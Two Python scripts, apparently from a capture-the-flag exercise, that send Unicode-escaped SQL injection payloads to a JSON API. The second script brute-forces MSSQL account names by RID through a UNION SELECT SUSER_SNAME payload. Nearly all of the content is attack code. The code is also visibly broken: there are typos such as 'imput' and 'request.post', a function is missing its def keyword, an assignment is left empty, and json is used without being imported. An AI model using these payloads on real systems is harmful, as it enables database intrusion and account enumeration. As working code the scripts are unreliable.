sqli.py

````python
#!/urs/bin/python3

from pwn import *
import requests, pdb, signal, time, sys

def def_handler(sig, frame):

    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#variables glbales
main_url = "http://10.10.xx.xx/api/getCollegues"
burp = {'http://127.0.0.1:8080'}

def getUnicode(sqli):

    sqli_modified = ""

    for character in sqli:
        sqli_modified += "\\u00" + hex(ord(character))[2::]

    return sqli_modified

makeRequest(sqli_modified):

    headers = {
         'Content-Type': 'aplication/json;charset=utf-8'
    }

    post_data = '{"name":"%s"}' % sqli_modified

    r = request.post(main_url, headers=headers, data=post_data)

    data_json = json.loads(r.text)
    return(json.dumps(data_json, indent=4))

if __name__ == '__main__':

    while True:

        sqli = imput("> ")
        sqli = sqli.strip()

        sqli_modified = getUnicode(sqli)

        response_json = makeRequest(sqli_modified)

        print(response_json)
        ````


sqli-v2.py
````python
#!/urs/bin/python3

from pwn import *
import requests, pdb, signal, time, sys

def def_handler(sig, frame):

    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

#Ctrl+C
signal.signal(signal.SIGINT, def_handler)

#variables glbales
main_url = "http://10.10.xx.xx/api/getCollegues"
burp = {'http://127.0.0.1:8080'}
sid = "0x015000"

# test' union select 1,(select SUSER_SNAME(0x0105000)),3,4,5-- -

def getUnicode(sqli):

    sqli_modified = ""

    for character in sqli:
        sqli_modified += "\\u00" + hex(ord(character))[2::]

    return sqli_modified

makeRequest(sqli_modified):

    headers = {
         'Content-Type': 'aplication/json;charset=utf-8'
    }

    post_data = '{"name":"%s"}' % sqli_modified

    r = request.post(main_url, headers=headers, data=post_data)

    data_json = json.loads(r.text)
    return(json.dumps(data_json, indent=4))

def getRID(x):

    rid_hex = hex(rid).replace('x', '')

    list = []

    for character in rid_hex:
        list.append(character)

    rid = list[2] + list[3] + list[0] + list[1] + "0000"

    return rid

if __name__ == '__main__':


    for x in range(1100, 1200): 
        
        rid = 
        sqli = "test' union select 1,(select SUSER_SNAME(%s%s)),3,4,5-- -" % (sid, rid)

        sqli_modified = getUnicode(sqli)

        response_json = makeRequest(sqli_modified)

        print(response_json)

        time.sleep(1)
        ````

